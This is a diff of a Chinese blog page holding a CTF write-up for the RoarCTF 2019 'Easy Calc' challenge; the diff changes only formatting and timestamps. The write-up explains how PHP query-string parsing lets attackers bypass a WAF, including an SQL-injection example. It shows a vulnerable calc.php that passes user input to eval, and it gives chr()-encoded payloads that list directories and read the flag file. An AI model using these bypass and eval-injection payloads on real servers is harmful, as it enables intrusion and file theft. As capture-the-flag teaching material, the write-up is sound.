@@ -45,15 +45,15 @@
   };
 </script>
 
-  <meta name="description" content="前置知识点  php字符串解析特性 PHP会将查询字符串（在URL或正文中）转换为内部关联数组$_GET或关联数组$_POST,例如会将 &#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。 然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。 如果一个IDS&#x2F;IPS或WA">
+  <meta name="description" content="前置知识点 php字符串解析特性 PHP会将查询字符串（在URL或正文中）转换为内部关联数组$_GET或关联数组$_POST,例如会将 &#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。  然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。  如果一个IDS&#x2F;IPS或W">
 <meta property="og:type" content="article">
 <meta property="og:title" content="BUUCTF WEB [RoarCTF 2019]Easy Calc">
 <meta property="og:url" content="https://yglsaltfish.github.io/2021/08/17/BUUCTF-WEB-RoarCTF-2019-Easy-Calc/index.html">
 <meta property="og:site_name" content="attpower的小站">
-<meta property="og:description" content="前置知识点  php字符串解析特性 PHP会将查询字符串（在URL或正文中）转换为内部关联数组$_GET或关联数组$_POST,例如会将 &#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。 然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。 如果一个IDS&#x2F;IPS或WA">
+<meta property="og:description" content="前置知识点 php字符串解析特性 PHP会将查询字符串（在URL或正文中）转换为内部关联数组$_GET或关联数组$_POST,例如会将 &#x2F;?foo&#x3D;bar变成Array([foo] &#x3D;&gt; “bar”)。  然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如&#x2F;?%20news[id%00&#x3D;42会转换为Array([news_id] &#x3D;&gt; 42)。  如果一个IDS&#x2F;IPS或W">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2021-08-17T03:03:53.000Z">
-<meta property="article:modified_time" content="2021-08-17T07:49:19.078Z">
+<meta property="article:modified_time" content="2021-08-17T07:51:25.634Z">
 <meta property="article:author" content="attpower">
 <meta name="twitter:card" content="summary">
 
@@ -206,7 +206,7 @@
               <span class="post-meta-item-text">发表于</span>
               
 
-              <time title="创建时间：2021-08-17 11:03:53 / 修改时间：15:49:19" itemprop="dateCreated datePublished" datetime="2021-08-17T11:03:53+08:00">2021-08-17</time>
+              <time title="创建时间：2021-08-17 11:03:53 / 修改时间：15:51:25" itemprop="dateCreated datePublished" datetime="2021-08-17T11:03:53+08:00">2021-08-17</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -238,52 +238,16 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="前置知识点">前置知识点</h3><ol>
-<li>
-<p>php字符串解析特性<br>
-PHP会将查询字符串（在URL或正文中）转换为内部关联数组<code>$_GET</code>或关联数组<code>$_POST</code>,例如会将 <code>/?foo=bar变成Array([foo] =&gt; “bar”)</code>。</p>
-<p>然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。</p>
-<p>如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<code>/news.php?%20news[id%00=42&quot;+AND+1=0–</code>这句话的意思就是<code>$_GET[&quot;news_id&quot;]=42&quot;+AND+1=0-</code></p>
-<table>
-<thead>
-<tr>
-<th>User_Input</th>
-<th>Decode_PHP</th>
-<th>variable name</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>%20foo_bar%00</td>
-<td>foo_bar</td>
-<td>foo_bar</td>
-</tr>
-<tr>
-<td>foo%20bar%00</td>
-<td>foo bar</td>
-<td>foo bar</td>
-</tr>
-<tr>
-<td>foo%5bbar</td>
-<td>foo[bar</td>
-<td>foo_bar</td>
-</tr>
-</tbody>
-</table>
+        <h3 id="前置知识点"><a href="#前置知识点" class="headerlink" title="前置知识点"></a>前置知识点</h3><ol>
+<li><p>php字符串解析特性<br> PHP会将查询字符串（在URL或正文中）转换为内部关联数组<code>$_GET</code>或关联数组<code>$_POST</code>,例如会将 <code>/?foo=bar变成Array([foo] =&gt; “bar”)</code>。</p>
+<p> 然而查询字符串在解析的过程中会将某些字符删除或用下划线代替，如<code>/?%20news[id%00=42</code>会转换为<code>Array([news_id] =&gt; 42)</code>。</p>
+<p> 如果一个IDS/IPS或WAF中有一条规则是当news_id参数的值是一个非数字的值则拦截，那么我们就可以用以下语句绕过：<code>/news.php?%20news[id%00=42&quot;+AND+1=0–</code>这句话的意思就是<code>$_GET[&quot;news_id&quot;]=42&quot;+AND+1=0-</code></p>
+<p> |User_Input|Decode_PHP|variable name|<br> |-|-|-|<br> %20foo_bar%00|foo_bar|foo_bar|<br> foo%20bar%00|foo bar|foo bar|<br> foo%5bbar|foo[bar|foo_bar</p>
 </li>
-<li>
-<p>使用chr()函数绕过匹配</p>
-</li>
+<li>使用chr()函数绕过匹配</li>
 </ol><a id="more"></a>
-
 <p>num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</p>
-<h3 id="题目">题目</h3>
-<p>打开题目，F12查看源代码</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span></span><br><span class="line">    $(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">            type:&#x27;GET&#x27;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">strong</span>&gt;</span>答案:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>$&#123;data&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>发现有calc.php文件并且网页开启了WAF。<br>
-打开calc.php 文件，查看源代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>发现了过滤机制，虽然WAF防御了<code>num</code>变量，但是并没有防御<code>%20num</code>,于是可以使用空格绕过WAF，然后使用eval执行命令。使用<code>chr()</code>函数绕过黑名单，使用<code>var_dump(scandir(chr(47)))</code>查看数组，发现存在f1agg文件，构造<code>payload=num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>即找到flag。</p>
+<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>打开题目，F12查看源代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--I&#x27;ve set up WAF to ensure security.--&gt;</span></span><br><span class="line">    $(&#x27;#calc&#x27;).submit(function()&#123;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            url:&quot;calc.php?num=&quot;+encodeURIComponent($(&quot;#content&quot;).val()),</span><br><span class="line">            type:&#x27;GET&#x27;,</span><br><span class="line">            success:function(data)&#123;</span><br><span class="line">                $(&quot;#result&quot;).html(`<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;alert alert-success&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">strong</span>&gt;</span>答案:<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>$&#123;data&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span>`);</span><br><span class="line">            &#125;,</span><br><span class="line">            error:function()&#123;</span><br><span class="line">                alert(&quot;这啥?算不来!&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        return false;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><br>发现有calc.php文件并且网页开启了WAF。<br>打开calc.php 文件，查看源代码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br>发现了过滤机制，虽然WAF防御了<code>num</code>变量，但是并没有防御<code>%20num</code>,于是可以使用空格绕过WAF，然后使用eval执行命令。使用<code>chr()</code>函数绕过黑名单，使用<code>var_dump(scandir(chr(47)))</code>查看数组，发现存在f1agg文件，构造<code>payload=num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code>即找到flag。</p>
 
     </div>
 
